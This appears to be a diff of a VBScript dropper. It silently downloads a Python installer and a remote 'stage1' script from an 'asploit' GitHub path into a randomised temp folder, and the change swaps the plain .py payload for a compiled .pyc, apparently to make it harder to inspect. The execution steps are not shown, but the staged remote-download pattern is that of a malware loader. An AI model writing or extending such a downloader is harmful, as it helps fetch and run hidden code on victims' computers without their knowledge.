@@ -5,7 +5,7 @@
 Dim PYTHON_URL, SCRIPT_URL, PYTHON_VERSION, INSTALL_DIR, SCRIPT_DIR, TEMP_DIR, PYTHON_INSTALLER, SCRIPT_NAME, LOG_FILE
 ' Preconfigured URLs
 PYTHON_URL = "https://www.python.org/ftp/python/3.11.7/python-3.11.7-amd64.exe"
-SCRIPT_URL = "https://raw.githubusercontent.com/blockbastaz/ressources/refs/heads/main/asploit/stage1.py"
+SCRIPT_URL = "https://raw.githubusercontent.com/blockbastaz/ressources/refs/heads/main/asploit/stage1.pyc"
 
 ' Extract Python version from the URL (e.g., "3.11.7" → "311")
 Dim versionParts, majorMinor
@@ -24,7 +24,7 @@ Dim timestamp
 timestamp = Replace(Replace(Replace(Now, "/", ""), ":", ""), " ", "_") ' e.g., "2025-04-05_12-34-56"
 TEMP_DIR = WShell.ExpandEnvironmentStrings("%TEMP%") & "\tmp_" & timestamp & "_" & Int((9999 * Rnd) + 1000)
 PYTHON_INSTALLER = TEMP_DIR & "\python-installer.exe"
-SCRIPT_NAME = TEMP_DIR & "\stage1.py"
+SCRIPT_NAME = TEMP_DIR & "\stage1.pyc"
 LOG_FILE = TEMP_DIR & "\debug.log"
 
 ' Create a shell object for running commands
